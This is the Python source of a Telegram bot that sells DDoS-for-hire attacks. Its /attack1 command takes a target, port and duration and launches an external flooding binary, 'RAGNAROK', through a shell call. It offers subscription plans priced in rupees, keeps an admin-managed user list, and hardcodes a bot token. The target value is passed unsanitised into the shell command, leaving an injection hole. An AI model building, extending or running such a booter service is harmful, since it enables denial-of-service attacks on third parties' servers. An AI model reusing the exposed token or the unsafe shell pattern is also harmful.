import telebot
import subprocess
import os
import datetime

# Replace with your bot's token
bot = telebot.TeleBot("7600239180:AAH2gAmpfqc66Q2Ffwuj7BwC2KbSQZqA1II")

# Admin user IDs
ADMIN_IDS = ["5900643820"]

# File paths
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List of allowed user IDs
allowed_user_ids = read_users()

# Function to log commands
def log_command(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Command: /start
@bot.message_handler(commands=["start"])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome, {user_name}! Use /help to see available commands."
    bot.reply_to(message, response)

# Command: /help
@bot.message_handler(commands=["help"])
def show_help(message):
    help_text = """Available commands:
    /attack1 <target> <port> <time> - Start an attack.
    /mylogs - View your attack logs.
    /rules - View usage rules.
    /plan - View subscription plans.
    
    Admin-only commands:
    /add <userId> - Add a user.
    /remove <userId> - Remove a user.
    /allusers - List authorized users.
    /logs - View all logs.
    /clearlogs - Clear logs.
    /broadcast <message> - Broadcast a message."""
    bot.reply_to(message, help_text)

# Command: /rules
@bot.message_handler(commands=["rules"])
def welcome_rules(message):
    response = """Please follow these rules:
    1. Do not run multiple attacks simultaneously.
    2. Do not abuse the service to avoid getting banned."""
    bot.reply_to(message, response)

# Command: /plan
@bot.message_handler(commands=["plan"])
def view_plan(message):
    response = """Subscription Plans:
    VIP:
    - Attack time: 200 seconds
    - Cooldown: 2 minutes
    - Concurrent attacks: 300
    Prices:
    Per match: 30 INR
    Per hour: 50 INR
    Per day: 250 INR
    Per week: 900 INR
    Per month: 1600 INR
    Lifetime: 2000 INR."""
    bot.reply_to(message, response)

# Command: /attack1
@bot.message_handler(commands=["attack1"])
def attack1(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: /attack1 <target> <port> <time>")
            return

        target, port, time = parts[1], parts[2], parts[3]
        try:
            port = int(port)
            time = int(time)
        except ValueError:
            bot.reply_to(message, "Port and time must be integers.")
            return

        if time > 300:
            bot.reply_to(message, "Error: Time interval must be less than or equal to 300 seconds.")
            return

        log_command(user_id, "/attack1", target, port, time)
        response = f"Attack started on {target}:{port} for {time} seconds."
        bot.reply_to(message, response)

        # Execute the attack command
        subprocess.run(f"./RAGNAROK {target} {port} {time}", shell=True)

        bot.reply_to(message, f"Attack on {target}:{port} completed.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Command: /mylogs
@bot.message_handler(commands=["mylogs"])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or user_id in ADMIN_IDS:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                if user_logs:
                    bot.reply_to(message, "Your logs:\n" + "".join(user_logs))
                else:
                    bot.reply_to(message, "No logs found for your account.")
        except FileNotFoundError:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /add
@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) == 2:
            new_user = parts[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                with open(USER_FILE, "a") as file:
                    file.write(new_user + "\n")
                bot.reply_to(message, f"User {new_user} added successfully.")
            else:
                bot.reply_to(message, "User is already authorized.")
        else:
            bot.reply_to(message, "Usage: /add <userId>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /remove
@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) == 2:
            remove_user = parts[1]
            if remove_user in allowed_user_ids:
                allowed_user_ids.remove(remove_user)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(user + "\n")
                bot.reply_to(message, f"User {remove_user} removed successfully.")
            else:
                bot.reply_to(message, "User not found.")
        else:
            bot.reply_to(message, "Usage: /remove <userId>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /allusers
@bot.message_handler(commands=["allusers"])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        if allowed_user_ids:
            bot.reply_to(message, "Authorized Users:\n" + "\n".join(allowed_user_ids))
        else:
            bot.reply_to(message, "No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /logs
@bot.message_handler(commands=["logs"])
def view_logs(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /clearlogs
@bot.message_handler(commands=["clearlogs"])
def clear_logs(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        if os.path.exists(LOG_FILE):
            open(LOG_FILE, "w").close()
            bot.reply_to(message, "Logs cleared.")
        else:
            bot.reply_to(message, "No logs to clear.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Admin Command: /broadcast
@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split(maxsplit=1)
        if len(parts) == 2:
            msg = parts[1]
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, msg)
                except:
                    continue
            bot.reply_to(message, "Broadcast sent.")
        else:
            bot.reply_to(message, "Usage: /broadcast <message>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Start the bot
bot.polling(none_stop=True)